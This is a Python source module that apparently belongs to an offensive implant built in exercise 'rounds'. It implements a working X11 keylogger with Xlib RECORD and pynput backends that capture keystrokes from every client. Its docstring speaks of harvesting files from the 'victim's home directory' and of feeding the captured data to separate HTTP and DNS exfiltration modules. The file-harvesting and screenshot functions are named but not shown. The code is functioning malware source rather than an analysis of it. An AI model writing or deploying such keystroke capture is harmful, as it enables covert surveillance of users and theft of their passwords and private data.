"""Collection primitives shared by all rounds.

Public API:
    Keylogger(backend=None)     — X11 keystroke capture
    harvest_files(home, rels)   — read files from the victim's home directory (Task 5)
    take_screenshot(path)       — invoke `scrot` against the current DISPLAY (Task 5)

No networking lives here; exfiltration modules (exfil_http.py, later exfil_dns.py)
consume these collectors' outputs.
"""
from __future__ import annotations

import os
import shutil
import subprocess
import threading
from pathlib import Path
from typing import Iterable, Optional


class _NullBackend:
    """Inert backend used in unit tests and hosts without X11."""

    def __init__(self, buffer: list[str]) -> None:
        self._buffer = buffer

    def start(self) -> None:
        pass

    def stop(self) -> None:
        pass


class _PynputBackend:
    """Fallback backend (spec: Xlib primary, pynput fallback)."""

    def __init__(self, buffer: list[str]) -> None:
        self._buffer = buffer
        self._listener = None

    def start(self) -> None:
        from pynput import keyboard

        def _on_press(key):
            try:
                self._buffer.append(key.char if key.char else f"[{key.name}]")
            except AttributeError:
                self._buffer.append(f"[{key}]")

        self._listener = keyboard.Listener(on_press=_on_press)
        self._listener.daemon = True
        self._listener.start()

    def stop(self) -> None:
        if self._listener is not None:
            self._listener.stop()
            self._listener = None


class _XlibBackend:
    """Primary backend: python-xlib RECORD extension reading raw KeyPress events."""

    def __init__(self, buffer: list[str]) -> None:
        self._buffer = buffer
        self._local_dpy = None
        self._record_dpy = None
        self._ctx = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        from Xlib import display, X
        from Xlib.ext import record
        from Xlib.protocol import rq

        self._local_dpy = display.Display()
        self._record_dpy = display.Display()

        def _handler(reply):
            if reply.category != record.FromServer:
                return
            if reply.client_swapped:
                return
            if len(reply.data) < 2:
                return
            data = reply.data
            while len(data):
                event, data = rq.EventField(None).parse_binary_value(
                    data, self._record_dpy.display, None, None
                )
                if event.type == X.KeyPress:
                    keysym = self._local_dpy.keycode_to_keysym(event.detail, 0)
                    ch = chr(keysym) if 32 <= keysym < 127 else f"[ks:{keysym}]"
                    self._buffer.append(ch)

        self._ctx = self._record_dpy.record_create_context(
            0,
            [record.AllClients],
            [{
                "core_requests": (0, 0),
                "core_replies": (0, 0),
                "ext_requests": (0, 0, 0, 0),
                "ext_replies": (0, 0, 0, 0),
                "delivered_events": (0, 0),
                "device_events": (X.KeyPress, X.MotionNotify),
                "errors": (0, 0),
                "client_started": False,
                "client_died": False,
            }],
        )

        def _pump():
            self._record_dpy.record_enable_context(self._ctx, _handler)

        self._thread = threading.Thread(target=_pump, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        if self._ctx is not None and self._record_dpy is not None:
            self._record_dpy.record_disable_context(self._ctx)
            self._record_dpy.record_free_context(self._ctx)
            self._ctx = None


class Keylogger:
    """X11 keystroke capture.

    `backend`:
        None      — auto-detect (xlib → pynput → null)
        "xlib"    — force Xlib; raises if unavailable
        "pynput"  — force pynput; raises if unavailable
        "null"    — inert, for unit tests
    """

    BACKEND_PREFERENCE: tuple[str, ...] = ("xlib", "pynput")

    def __init__(self, backend: Optional[str] = None) -> None:
        self.buffer: list[str] = []
        self.active_backend: str = self._select_backend(backend)
        self._impl = self._build_impl(self.active_backend)

    def _select_backend(self, requested: Optional[str]) -> str:
        if requested == "null":
            return "null"
        if requested is not None and requested not in self.BACKEND_PREFERENCE:
            raise ValueError(f"unknown backend: {requested!r}")
        if requested == "xlib":
            if not self._xlib_usable():
                raise ValueError("backend 'xlib' requested but not available (no DISPLAY or python-xlib missing)")
            return "xlib"
        if requested == "pynput":
            if not self._pynput_usable():
                raise ValueError("backend 'pynput' requested but not available (no DISPLAY or pynput missing)")
            return "pynput"
        # Auto-detect.
        if self._xlib_usable():
            return "xlib"
        if self._pynput_usable():
            return "pynput"
        return "null"

    @staticmethod
    def _xlib_usable() -> bool:
        if not os.environ.get("DISPLAY"):
            return False
        try:
            import Xlib.display  # noqa: F401
            import Xlib.ext.record  # noqa: F401
        except Exception:
            return False
        return True

    @staticmethod
    def _pynput_usable() -> bool:
        try:
            from pynput import keyboard  # noqa: F401
        except Exception:
            return False
        return bool(os.environ.get("DISPLAY"))

    def _build_impl(self, name: str):
        if name == "xlib":
            return _XlibBackend(self.buffer)
        if name == "pynput":
            return _PynputBackend(self.buffer)
        return _NullBackend(self.buffer)

    def start(self) -> None:
        self._impl.start()

    def stop(self) -> None:
        self._impl.stop()

    def flush(self) -> list[str]:
        """Return a copy of the buffer and clear it."""
        snapshot = list(self.buffer)
        self.buffer.clear()
        return snapshot
